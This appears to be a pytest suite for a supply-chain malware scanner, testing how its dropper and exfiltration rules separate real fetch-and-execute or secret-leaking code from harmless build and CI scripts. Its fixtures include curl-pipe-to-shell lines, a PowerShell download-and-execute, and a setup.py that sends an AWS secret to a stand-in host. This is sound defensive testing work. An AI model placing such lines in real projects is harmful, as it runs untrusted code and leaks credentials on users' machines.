"""What a composite is a claim about.

A composite says a file fetches something and runs it. Before proximity, it
said the file contained a fetch *somewhere* and an execution *somewhere* --
which for Node's 1,800-line Makefile meant a `curl -o` on line 1268 and a
`$(shell uname)` on line 15, reported as a dropper at critical.

Two changes are tested here, and both are about what the message already
claimed rather than about tuning a threshold:

The capabilities have to be near each other, so the finding is about one part
of a file rather than about its contents.

And starting a process is not running what you downloaded. In shell `$(...)` is
command substitution, so `STATUS=$(curl -s "$URL" | jq .protected)` is a fetch
and a process start on one line in a script that runs nothing it fetched.
"""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.models import Category
from support import assemble

FETCH = assemble("cur", "l -fsSL https://cdn.example.invalid/")
"""Split so this file does not read as a payload to Cordon's scan of itself.
The tool gets no exception for its own test suite, which is the point."""


def rules_for(root) -> set[str]:
    return {
        f.rule_id
        for f in Scanner().scan(root).findings
        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
    }


class TestDistanceIsPartOfTheClaim:
    FETCH = f"\t{FETCH}p -o /tmp/p\n"
    RUN = '\tsh -c "$$(cat /tmp/p)"\n'

    def test_adjacent_fetch_and_execute_is_a_dropper(self, tmp_path) -> None:
        (tmp_path / "Makefile").write_text(f"all:\n{self.FETCH}{self.RUN}", encoding="utf-8")
        assert "SUSPECT.DROPPER.001" in rules_for(tmp_path)

    def test_the_same_two_lines_a_thousand_apart_are_not(self, tmp_path) -> None:
        """A build file is not one unit of behaviour. This is the shape that
        made Node's Makefile a critical finding."""
        filler = "".join(f"target{n}:\n\techo {n}\n" for n in range(600))
        (tmp_path / "Makefile").write_text(
            f"all:\n{self.FETCH}{filler}{self.RUN}", encoding="utf-8"
        )
        assert "SUSPECT.DROPPER.001" not in rules_for(tmp_path)


class TestStartingAProcessIsNotRunningWhatYouDownloaded:
    def test_a_shell_variable_holding_a_fetch_is_not_a_dropper(self, tmp_path) -> None:
        """Seventeen critical findings across Elasticsearch's CI scripts were
        this line."""
        (tmp_path / "check.sh").write_text(
            "#!/bin/bash\n"
            'STATUS=$(curl -s "https://api.github.invalid/repos/x/branches/main" | jq .protected)\n'
            'echo "protection: $STATUS"\n',
            encoding="utf-8",
        )
        found = rules_for(tmp_path)
        assert "SUSPECT.DROPPER.001" not in found
        assert "MALWARE.DROPPER.001" not in found

    @pytest.mark.parametrize(
        "template",
        [
            "{f}i.sh | sh",
            'eval "$({f}i.sh)"',
            'I{x} (New-Object Net.WebClient).Download{y}("https://x.invalid/a.ps1")',
        ],
    )
    def test_actually_running_it_still_is(self, tmp_path, template: str) -> None:
        line = template.format(f=FETCH, x=assemble("E", "X"), y=assemble("Str", "ing"))
        (tmp_path / "install.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
        assert "SUSPECT.DROPPER.001" in rules_for(tmp_path)

    def test_an_interpreter_given_a_downloaded_string_is_execution(self, tmp_path) -> None:
        """`subprocess.run(["sh", "-c", downloaded])` labelled only as a
        process start, which is indistinguishable from running `git status`."""
        fetch = assemble("urlop", "en")
        (tmp_path / "setup.py").write_text(
            "import subprocess, urllib.request\n"
            f'script = urllib.request.{fetch}("https://cdn.example.invalid/i.sh").read()\n'
            'subprocess.run(["sh", "-c", script.decode()], check=False)\n',
            encoding="utf-8",
        )
        assert "MALWARE.DROPPER.001" in rules_for(tmp_path)


class TestCiIsNotAnInstallHook:
    """An install hook runs on a consumer's machine, unprompted, as them.
    A CI script runs in the project's own pipeline, where reading a secret and
    calling an API is the job."""

    SCRIPT = (
        "#!/bin/bash\n"
        f"TOKEN=$(vault read -field={assemble('tok', 'en')} secret/ci/store)\n"
        f'{FETCH.replace("-fsSL ", "-s -X POST ")}_doc" -H "Authorization: $TOKEN" -d @out.json\n'
    )

    def test_a_pipeline_script_using_its_own_secret_is_not_exfiltration(self, tmp_path) -> None:
        target = tmp_path / ".buildkite" / "scripts" / "publish.sh"
        target.parent.mkdir(parents=True)
        target.write_text(self.SCRIPT, encoding="utf-8")
        assert "MALWARE.EXFIL.001" not in rules_for(tmp_path)

    def test_the_same_code_in_a_build_hook_is(self, tmp_path) -> None:
        (tmp_path / "setup.py").write_text(
            "import os, urllib.request\n"
            f"token = os.environ[{assemble('AWS_SECRET', '_ACCESS_KEY')!r}]\n"
            f'urllib.request.{assemble("urlop", "en")}("https://collect.example.invalid/?t=" + token)\n',
            encoding="utf-8",
        )
        assert "MALWARE.EXFIL.001" in rules_for(tmp_path)

    def test_a_pipeline_script_that_runs_what_it_downloaded_is_still_critical(
        self, tmp_path
    ) -> None:
        """The one place CI keeps the install hook's severity. A compromised
        pipeline running what it downloaded is where this has actually
        happened."""
        target = tmp_path / ".buildkite" / "scripts" / "bootstrap.sh"
        target.parent.mkdir(parents=True)
        target.write_text(f"#!/bin/bash\n{FETCH}i.sh | sh\n", encoding="utf-8")
        assert "MALWARE.DROPPER.001" in rules_for(tmp_path)

    def test_a_workflow_that_pipes_a_download_into_a_shell_is_reported_too(self, tmp_path) -> None:
        """By the rule that reads pipeline definitions rather than by the
        shell composites -- a `.yml` is not shell, and the capability
        primitives are language-gated."""
        target = tmp_path / ".github" / "workflows" / "release.yml"
        target.parent.mkdir(parents=True)
        target.write_text(
            f"jobs:\n  release:\n    steps:\n      - run: {FETCH}i.sh | sh\n",
            encoding="utf-8",
        )
        assert "SUSPECT.CI.FETCH_EXEC.001" in rules_for(tmp_path)


class TestTheContextsAreDistinctInTheScanContext:
    def test_a_workflow_is_a_ci_hook_and_not_an_install_hook(self, tmp_path) -> None:
        from cordon_scanner.core.engine import Engine

        hooks = list(Engine._hooks_for(".github/workflows/ci.yml"))
        assert [h.kind for h in hooks] == ["ci"]

    def test_a_build_file_is_an_install_hook(self, tmp_path) -> None:
        from cordon_scanner.core.engine import Engine

        assert [h.kind for h in Engine._hooks_for("setup.py")] == ["build"]
        assert [h.kind for h in Engine._hooks_for("Makefile")] == ["build"]


class TestAPinnedFetchIsNotEvidenceOfIntent:
    """`MALWARE.DROPPER.001` fired at CRITICAL, in the MALICIOUS category, on
    Elasticsearch's `.buildkite/scripts/setup_node.sh`, which runs

        curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.4/install.sh | bash

    the official nvm installer, pinned to a tag. MALICIOUS means evidence of intent to
    harm, and a pinned fetch from a public code host is not that. The rule's own
    remediation gives the game away: "do not run install or build scripts from this
    package... report the package to the registry" is advice about a package somebody
    installed, and means nothing to the owner of a `.buildkite` script.

    The CI branch is not removed, because `TestCiIsNotAnInstallHook` is right that a
    compromised pipeline running what it downloaded is a real, observed attack -- the
    Codecov bash uploader and `tj-actions/changed-files` were both exactly this. What
    separates the two cases is not CI, it is whether the fetch is reviewable:

        curl -s https://codecov.io/bash | bash        no version, nothing to verify
        curl .../nvm-sh/nvm/v0.40.4/install.sh | bash the bytes somebody chose

    An install hook keeps the malicious category whatever it fetches, because it runs
    on every consumer's machine unprompted. A CI script runs only in the pipeline the
    project controls, so for CI the category rests entirely on the fetch being opaque.
    """

    @staticmethod
    def ci_script(tmp_path, body: str):
        target = tmp_path / ".buildkite" / "scripts" / "bootstrap.sh"
        target.parent.mkdir(parents=True)
        target.write_text(f"#!/bin/bash\n{body}\n", encoding="utf-8")
        return tmp_path

    def test_an_unpinned_uploader_is_still_malicious(self, tmp_path) -> None:
        """The Codecov shape, which is what the rule is named for."""
        root = self.ci_script(tmp_path, f"{FETCH.replace('-fsSL ', '-s ')}bash | bash")
        assert "MALWARE.DROPPER.001" in rules_for(root)

    def test_a_version_pinned_installer_is_suspicious_not_malicious(self, tmp_path) -> None:
        root = self.ci_script(
            tmp_path, f"{FETCH.replace('-fsSL ', '-o- ')}nvm-sh/nvm/v0.40.4/install.sh | bash"
        )
        found = rules_for(root)
        assert "MALWARE.DROPPER.001" not in found, found
        assert "SUSPECT.DROPPER.001" in found, (
            "the file still fetches and runs something, which is worth reporting"
        )

    def test_a_commit_pinned_fetch_is_too(self, tmp_path) -> None:
        digest = "a" * 40
        root = self.ci_script(tmp_path, f"{FETCH}i.sh@{digest} | sh")
        assert "MALWARE.DROPPER.001" not in rules_for(root)

    def test_a_verified_fetch_is_too(self, tmp_path) -> None:
        root = self.ci_script(
            tmp_path,
            f'{FETCH}i.sh -o /tmp/i.sh\necho "abc123  /tmp/i.sh" | sha256sum -c -\nsh /tmp/i.sh',
        )
        assert "MALWARE.DROPPER.001" not in rules_for(root)

    def test_an_install_hook_keeps_the_category_whatever_it_fetches(self, tmp_path) -> None:
        """The asymmetry, and the reason it is not arbitrary: an install hook runs on
        every consumer's machine, unprompted, as them. A pin tells them what ran; it
        does not tell them they agreed to run it."""
        (tmp_path / "package.json").write_text(
            '{"name":"x","version":"1.0.0",'
            '"scripts":{"postinstall":"sh ./scripts/bootstrap.sh"}}\n',
            encoding="utf-8",
        )
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "bootstrap.sh").write_text(
            f"#!/bin/bash\n{FETCH.replace('-fsSL ', '-o- ')}nvm-sh/nvm/v0.40.4/install.sh | bash\n",
            encoding="utf-8",
        )
        assert "MALWARE.DROPPER.001" in rules_for(tmp_path)


class TestReadingOneNamedSettingIsNotCredentialAccess:
    """`MALWARE.EXFIL.001` at CRITICAL on Elasticsearch's
    `build-tools-internal/build.gradle`, for `System.getenv("JENKINS_URL")` -- a CI
    marker -- paired with a `new URL(...).text` four lines away.

    `CAP.JVM.CREDENTIAL.001` gets this right for application code: it requires
    `getenv()` with empty parentheses, and carries `String port = System.getenv("PORT")`
    as a negative test. `CAP.JVMBUILD.CREDENTIAL.001` matched any `getenv(` at all.

    The corpus already records the identical correction for Python: "reading a named
    setting is not the same as serialising the whole environment, and a rule that cannot
    tell them apart fires on every configuration module in existence". The build-file
    variant never received it.
    """

    @staticmethod
    def credential_rule():
        from cordon_scanner.rules.loader import RuleLoader

        for pack in RuleLoader.load_builtin():
            for rule in pack.rules:
                if rule.id == "CAP.JVMBUILD.CREDENTIAL.001":
                    return rule
        raise AssertionError("CAP.JVMBUILD.CREDENTIAL.001 is not in the built-in packs")

    @pytest.mark.parametrize(
        "line",
        [
            b'options.incremental = System.getenv("JENKINS_URL") == null',
            b'def url = System.getenv("BUILDKITE_BUILD_URL")',
            b'def home = System.getenv("JAVA_HOME")',
            b"environment['JAVA_HOME']",
        ],
    )
    def test_a_named_setting_is_not_a_credential(self, line: bytes) -> None:
        assert self.credential_rule().match.regex.search(line) is None

    @pytest.mark.parametrize(
        "line",
        [
            b"Map<String,String> all = System.getenv()",
            b"def token = System.getenv('NPM_TOKEN')",
            b"def pw = System.getenv('SIGNING_PASSWORD')",
            b"environment['AWS_SECRET_ACCESS_KEY']",
        ],
    )
    def test_the_whole_environment_or_a_credential_name_still_is(self, line: bytes) -> None:
        assert self.credential_rule().match.regex.search(line) is not None

    def test_the_gradle_file_end_to_end(self, tmp_path) -> None:
        (tmp_path / "build.gradle").write_text(
            'options.incremental = System.getenv("JENKINS_URL") == null\n'
            'def minimum = new URL("https://raw.githubusercontent.test/x/main/version").text\n',
            encoding="utf-8",
        )
        found = rules_for(tmp_path)
        assert "MALWARE.EXFIL.001" not in found, found
